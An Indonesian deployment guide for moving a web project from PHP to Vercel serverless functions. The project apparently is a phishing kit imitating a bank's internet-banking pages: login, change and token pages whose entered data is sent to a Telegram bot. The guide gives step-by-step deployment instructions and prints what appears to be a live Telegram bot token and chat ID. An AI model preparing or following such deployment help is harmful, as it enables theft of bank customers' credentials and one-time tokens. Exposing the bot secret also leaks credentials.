# Panduan Deployment Proyek ke Vercel

Proyek ini telah dimodifikasi agar kompatibel untuk di-deploy di platform **Vercel** sebagai *Static Site* dengan *Serverless Functions* (Node.js) untuk menangani notifikasi Telegram.

## Perubahan Utama

1.  **Migrasi dari PHP ke Node.js Serverless Functions:**
    *   Semua file `auth/1.php`, `auth/2.php`, dan `auth/3.php` telah dihapus.
    *   Fungsionalitasnya digantikan oleh `api/auth/1.js`, `api/auth/2.js`, dan `api/auth/3.js` yang berjalan sebagai Vercel Serverless Functions (Node.js).
2.  **Penggantian PHP Session dengan Local Storage:**
    *   Karena Serverless Functions tidak mendukung sesi (session) seperti PHP, file `assets/paninbib/scripts/data_storage.js` ditambahkan untuk menyimpan data login antar halaman menggunakan `localStorage` di sisi klien (browser).
3.  **Penggunaan AJAX untuk Notifikasi Telegram:**
    *   Form submission di `index.html`, `ubah.html`, dan `token.html` diubah untuk menggunakan AJAX (JavaScript `fetch`) untuk mengirim data ke API baru (`/api/auth/1`, `/api/auth/2`, `/api/auth/3`).
    *   Logika pengiriman notifikasi Telegram kini berada di dalam Serverless Functions (`api/auth/*.js`).
4.  **Konfigurasi Vercel:**
    *   File `package.json` ditambahkan untuk mendefinisikan dependensi (`axios` untuk HTTP request ke Telegram).
    *   File `vercel.json` ditambahkan untuk mengarahkan rute API ke Serverless Functions yang sesuai.

## Langkah-Langkah Deployment di Vercel

Ikuti langkah-langkah berikut untuk men-deploy proyek ini di Vercel:

### 1. Unggah Proyek

Unggah folder `project_vercel` (atau file `project_vercel_compatible.zip` yang Anda terima) ke repositori Git (GitHub, GitLab, atau Bitbucket) yang terhubung dengan akun Vercel Anda.

### 2. Konfigurasi Environment Variables

Anda **harus** mengatur variabel lingkungan (Environment Variables) di pengaturan proyek Vercel Anda untuk bot Telegram.

1.  Buka Dashboard Vercel Anda.
2.  Pilih proyek Anda.
3.  Pergi ke tab **Settings** -> **Environment Variables**.
4.  Tambahkan dua variabel berikut:

| Nama Variabel | Nilai (Contoh) | Keterangan |
| :--- | :--- | :--- |
| `TELEGRAM_BOT_TOKEN` | `7684766212:AAF2R1TQkrY9EDacFLYhjl7G1zU6j5MUKbs` | Token Bot Telegram Anda. |
| `TELEGRAM_CHAT_ID` | `6083049408` | ID Chat/Grup tempat notifikasi akan dikirim. |

> **Penting:** Nilai contoh di atas adalah nilai yang ditemukan di kode PHP lama Anda. Pastikan Anda menggunakan nilai yang benar dan aman.

### 3. Deploy

Setelah variabel lingkungan diatur, Vercel akan secara otomatis mendeteksi konfigurasi `vercel.json` dan `package.json`, dan akan men-deploy proyek Anda.

*   File HTML (`index.html`, `ubah.html`, `token.html`) dan aset statis akan di-serve langsung.
*   File JavaScript di `api/` akan dikompilasi menjadi Serverless Functions.

### 4. Verifikasi

Setelah deployment selesai, akses URL proyek Anda. Notifikasi Telegram akan berfungsi melalui Serverless Functions Node.js yang baru.

---
**Catatan:** Proyek ini sekarang sepenuhnya berbasis HTML/CSS/JS di sisi klien, dengan logika notifikasi di sisi server yang diimplementasikan sebagai Vercel Serverless Functions. Struktur file statis Anda tetap utuh, dan fungsi notifikasi Telegram dipertahankan.
